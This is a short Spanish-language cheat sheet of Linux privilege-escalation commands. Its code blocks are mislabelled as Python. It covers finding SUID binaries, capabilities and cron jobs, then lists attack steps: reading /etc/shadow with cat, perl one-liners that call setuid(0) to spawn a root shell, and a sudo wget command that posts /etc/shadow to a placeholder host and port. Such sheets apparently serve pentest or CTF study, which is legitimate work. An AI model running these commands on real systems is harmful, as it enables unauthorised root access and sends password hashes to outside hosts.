### Buscar Permisos SUID

```python
	find / -perm -u=s -type f 2>/dev/null
```
### Buscar binarios

```python
	find / -perm -4000 2>/dev/null
```
### Capabilities

```python
	getcap -r / 2>/dev/null
```
### Tareas programadas

```python
	cat /etc/crontab
```

---
### Escaladas 
### Escalada de privilegios con cat

```python
	/bin/cat /etc/shadow
```
### Escalada de privilegios con perl 

```python
	echo -ne '#!/bin/perl \nuse POSIX qw(setuid); \nPOSIX::setuid(0); \nexec "/bin/bash";' > script.pl
	
	perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
	
```
### Escalada de privilegios con wget

```python
sudo /usr/bin/wget --post-file=/etc/shadow <local-ip> <puerto>
```
